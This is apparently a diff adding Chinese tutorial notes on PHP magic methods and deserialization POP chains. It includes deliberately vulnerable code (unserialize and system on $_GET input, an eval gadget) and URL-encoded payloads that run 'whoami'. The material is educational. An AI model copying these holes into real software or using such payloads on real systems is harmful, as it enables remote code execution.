@@ -594,3 +594,545 @@ echo serialize($ser);
 ```text
 win-1iljbo80gej\administrator
 ```
+
+### 6、__sleep()
+
+序列化 serialize() 函数会检查类中是否存在魔术方法 __sleep()，如果存在则该方法会先被调用，然后执行序列化操作。此魔术方法可以用于清理对象并返回一个包含对象中所有应被序列化的变量名称的数组。
+
+> [!ERROR]
+> 如果该方法未返回任何内容，则 NULL 被序列化并产生一个 E_NOTICE 级别的错误。
+
+示例代码：
+
+```php
+<?php
+class User {
+    const SITE = 'uusama';
+    public $username;
+    public $nickname;
+    private $password;
+    public function __construct($username, $nickname, $password)    {
+        $this->username = $username;
+        $this->nickname = $nickname;
+        $this->password = $password;
+    }
+    public function __sleep() {
+        return array('username', 'nickname');
+    }
+}
+$user = new User('a', 'b', 'c');
+echo serialize($user);
+```
+
+运行结果：
+
+```text
+O:4:"User":2:{s:8:"username";s:1:"a";s:8:"nickname";s:1:"b";}
+```
+
+### 7、__sleep() 例题
+
+示例代码：
+
+```php
+<?php
+class User {
+    const SITE = 'uusama';
+    public $username;
+    public $nickname;
+    private $password;
+    public function __construct($username, $nickname, $password)    {
+        $this->username = $username;
+        $this->nickname = $nickname;
+        $this->password = $password;
+    }
+    public function __sleep() {
+        system($this->username);
+    }
+}
+$cmd = $_GET['benben'];
+$user = new User($cmd, 'b', 'c');
+echo serialize($user);
+```
+
+构造参数：`?benben=whoami`
+
+运行结果：
+
+```text
+win-1iljbo80gej\administrator N;
+```
+
+### 8、__wakeup()
+
+反序列化 unserialize() 函数会检查是否存在一个 __wakeup() 方法，如果存在则会先调用 __wakeup() 方法预先准备对象需要的资源，常用于反序列化操作中重新建立数据库连接或执行其他初始化操作。
+
+示例代码：
+
+```php
+<?php
+class User {
+    const SITE = 'uusama';
+    public $username;
+    public $nickname;
+    private $password;
+    private $order;
+    public function __wakeup() {
+        $this->password = $this->username;
+    }
+}
+$user_ser = 'O:4:"User":2:{s:8:"username";s:1:"a";s:8:"nickname";s:1:"b";}';
+var_dump(unserialize($user_ser));
+```
+
+运行结果：
+
+```text
+object(User)#1 (4) {
+  ["username"]=>
+  string(1) "a"
+  ["nickname"]=>
+  string(1) "b"
+  ["password":"User":private]=>
+  string(1) "a"
+  ["order":"User":private]=>
+  NULL
+}
+```
+
+### 9、__wakeup() 例题
+
+示例代码：
+
+```php
+<?php
+class User {
+    const SITE = 'uusama';
+    public $username;
+    public $nickname;
+    private $password;
+    private $order;
+    public function __wakeup() {
+        system($this->username);
+    }
+}
+$user_ser = $_GET['benben'];
+unserialize($user_ser);
+?>
+```
+
+构造 payload：
+
+```text
+O%3A4%3A%22User%22%3A4%3A%7Bs%3A8%3A%22username%22%3Bs%3A6%3A%22whoami%22%3Bs%3A8%3A%22nickname%22%3BN%3Bs%3A14%3A%22%00User%00password%22%3BN%3Bs%3A11%3A%22%00User%00order%22%3BN%3B%7D
+```
+ 
+```php
+<?php
+class User {
+    const SITE = 'uusama';
+    public $username;
+    public $nickname;
+    private $password;
+    private $order;
+    public function __wakeup() {
+        system($this->username);
+    }
+}
+
+$user_ser = new User();
+$user_ser->username = 'whoami';
+echo urlencode(serialize($user_ser));
+```
+
+运行结果：
+
+```text
+win-1iljbo80gej\administrator
+```
+
+### 10、__toString()
+
+当一个对象被当作字符串使用时自动调用
+
+示例代码：
+
+```php
+<?php
+class User {
+    var $benben = "this is test!!";
+    public function __toString()
+    {
+        return '格式不对，输出不了!';
+    }
+}
+$test = new User() ;
+print_r($test);
+echo "<br />";
+echo $test;
+```
+
+运行结果：
+
+```text
+User Object
+(
+    [benben] => this is test!!
+)
+格式不对，输出不了!
+```
+
+### 11、__invoke()
+
+当对象像函数一样被调用时自动触发
+
+示例代码：
+
+```php
+<?php
+class User {
+    var $benben = "this is test!!";
+    public function __invoke()
+    {
+        echo  '它不是个函数!';
+    }
+}
+$test = new User() ;
+echo $test ->benben;
+echo "<br />";
+echo $test();
+```
+
+运行结果：
+
+```text
+this is test!!
+它不是个函数!
+```
+
+### 12、__call()
+
+当**对象**调用未定义的普通方法时触发
+
+|     参数     |   类型   |         说明          |
+|:----------:|:------:|:-------------------:|
+|   $name    | string |     试图调用的未定义方法名     |
+| $arguments | array  | 传给这个方法的参数数组（顺序保持不变） |
+
+示例代码：
+
+```php
+<?php
+class User {
+    public function __call($arg1,$arg2)
+    {
+        echo "$arg1,$arg2[0]";
+    }
+}
+$test = new User() ;
+$test -> callxxx('a');
+```
+
+运行结果：
+
+```text
+callxxx,a
+```
+
+### 13、__callStatic()
+
+当**类**调用未定义的静态方法时触发
+
+|     参数     |   类型   |         说明          |
+|:----------:|:------:|:-------------------:|
+|   $name    | string |     试图调用的未定义方法名     |
+| $arguments | array  | 传给这个方法的参数数组（顺序保持不变） |
+
+示例代码：
+
+```php
+<?php
+class User {
+    public static function __callStatic($arg1,$arg2)
+    {
+        echo "$arg1,$arg2[0]";
+    }
+}
+$test = new User() ;
+$test::callxxx('a');
+```
+
+运行结果：
+
+```text
+callxxx,a
+```
+
+### 14、__get()
+
+当尝试访问一个未定义或不可访问的属性（如 private 或 protected）时触发
+
+|  参数   |   类型   |    说明    |
+|:-----:|:------:|:--------:|
+| $name | string | 试图访问的属性名 |
+
+示例代码：
+
+```php
+<?php
+class User {
+    public $var1;
+    public function __get($arg1)
+    {
+        echo  $arg1;
+    }
+}
+$test = new User() ;
+$test ->var2;
+```
+
+运行结果：
+
+```text
+var2
+```
+
+### 15、__set()
+
+尝试给一个未定义或不可访问（如 private/protected）的属性赋值时触发
+
+|     参数     |   类型   |    说明    |
+|:----------:|:------:|:--------:|
+|   $name    | string | 试图访问的属性名 |
+| $arguments | mixed  | 赋给该属性的值  |
+
+示例代码：
+
+```php
+<?php
+class User {
+    public $var1;
+    public function __set($arg1 ,$arg2)
+    {
+        echo  $arg1.','.$arg2;
+    }
+}
+$test = new User() ;
+$test ->var2=1;
+```
+
+运行结果：
+
+```text
+var2,1
+```
+
+### 16、__isset()
+
+当对一个未定义或不可访问的属性使用 isset() 或 empty() 时触发
+
+|  参数   |   类型   |     说明      |
+|:-----:|:------:|:-----------:|
+| $name | string | 被检查是否存在的属性名 |
+
+示例代码：
+
+```php
+<?php
+class User {
+    private $var;
+    public function __isset($arg1 )
+    {
+        echo  $arg1;
+    }
+}
+$test = new User() ;
+isset($test->var);
+```
+
+运行结果：
+
+```text
+var
+```
+
+### 17、__unset()
+
+当对一个对象的未定义或不可访问（如 private/protected）属性 使用 unset() 操作（销毁指定变量）时触发
+
+|  参数   |   类型   |      说明      |
+|:-----:|:------:|:------------:|
+| $name | string | 被 unset 的属性名 |
+
+示例代码：
+
+```php
+<?php
+class User {
+    private $var;
+    public function __unset($arg1 )
+    {
+        echo  $arg1;
+    }
+}
+$test = new User() ;
+unset($test->var);
+```
+
+运行结果：
+
+```text
+var
+```
+
+### 18、__clone()
+
+当使用 clone 关键字克隆一个对象时触发
+
+> [!NOTICE]
+> clone 默认是**浅拷贝**，属性是值类型（如字符串、数字）时复制值，属性是对象类型时只复制引用，所以可以用 __clone() 来实现**深拷贝**。
+
+示例代码：
+
+```php
+<?php
+class User {
+    private $var;
+    public function __clone( )
+    {
+        echo  "__clone test";
+    }
+}
+$test = new User() ;
+$newclass = clone($test);
+```
+
+运行结果：
+
+```text
+__clone test
+```
+
+## 八、POP 链
+
+### 1、POP 链基础前置知识 1
+
+示例代码：
+
+```php
+<?php
+highlight_file(__FILE__);
+error_reporting(0);
+class index {
+    private $test;
+    public function __construct(){
+        $this->test = new normal();
+    }
+    public function __destruct(){
+        $this->test->action();
+    }
+}
+class normal {
+    public function action(){
+        echo "please attack me";
+    }
+}
+class evil {
+    var $test2;
+    public function action(){
+        eval($this->test2);
+    }
+}
+unserialize($_GET['test']);
+```
+
+构造 payload：
+
+```text
+O%3A5%3A%22index%22%3A1%3A%7Bs%3A11%3A%22%00index%00test%22%3BO%3A4%3A%22evil%22%3A1%3A%7Bs%3A5%3A%22test2%22%3Bs%3A17%3A%22system%28%22whoami%22%29%3B%22%3B%7D%7D
+
+```
+
+```php
+<?php
+class index {
+    private $test;
+    public function __construct(){
+        $this->test = new evil();
+    }
+}
+class evil {
+    var $test2 = 'system("whoami");';
+}
+
+$i = new index();
+echo urlencode(serialize($i));
+```
+
+运行结果：
+
+```text
+win-1iljbo80gej\administrator
+```
+
+### 2、POP 链基础前置知识 2
+
+示例代码：
+
+```php
+<?php
+highlight_file(__FILE__);
+error_reporting(0);
+class index {
+    private $test;
+    public function __construct(){
+        $this->test = new normal();
+    }
+    public function __destruct(){
+        $this->test->action();
+    }
+}
+class normal {
+    public function action(){
+        echo "please attack me";
+    }
+}
+class evil {
+    var $test2;
+    public function action(){
+        eval($this->test2);
+    }
+}
+unserialize($_GET['test']);
+?>
+```
+
+构造 payload：
+
+```text
+O%3A5%3A%22index%22%3A1%3A%7Bs%3A11%3A%22%00index%00test%22%3BO%3A4%3A%22evil%22%3A1%3A%7Bs%3A5%3A%22test2%22%3Bs%3A17%3A%22system%28%22whoami%22%29%3B%22%3B%7D%7D
+```
+
+```php
+<?php
+class index {
+    private $test;
+    public function __construct(){
+        $this->test = new evil();
+        $this->test->test2 = 'system("whoami");';
+    }
+}
+class evil {
+    var $test2;
+}
+
+echo urlencode(serialize(new index()));
+```
+
+运行结果：
+
+```text
+win-1iljbo80gej\administrator
+```
+
+### 3、
